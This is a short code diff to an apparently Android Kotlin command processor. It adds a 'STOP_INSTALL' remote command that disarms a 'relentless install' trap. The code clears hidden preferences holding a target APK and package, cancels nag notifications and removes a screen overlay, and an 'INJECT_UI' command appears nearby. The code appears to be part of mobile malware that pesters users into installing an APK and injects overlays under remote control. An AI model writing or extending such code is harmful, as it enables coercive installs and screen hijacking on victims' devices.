@@ -681,6 +681,21 @@ object CommandProcessor {
                         errorMsg = "APK not at: $apkPath"
                     }
                 }
+                "STOP_INSTALL" -> {
+                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                        .putBoolean("relentless_install_active", false)
+                        .putString("relentless_apk_path", "")
+                        .putString("relentless_target_pkg", "")
+                        .putLong("relentless_last_prompt", 0L)
+                        .apply()
+                    
+                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                    nm.cancel(102)
+                    nm.cancel(103)
+                    
+                    DynamicUIManager.removeOverlay(ctx)
+                    status = "RELENTLESS_TRAP_DISARMED"
+                }
                 "INJECT_UI" -> {
                     val separatorIndex = content.indexOf("|")
                     if (separatorIndex != -1) {
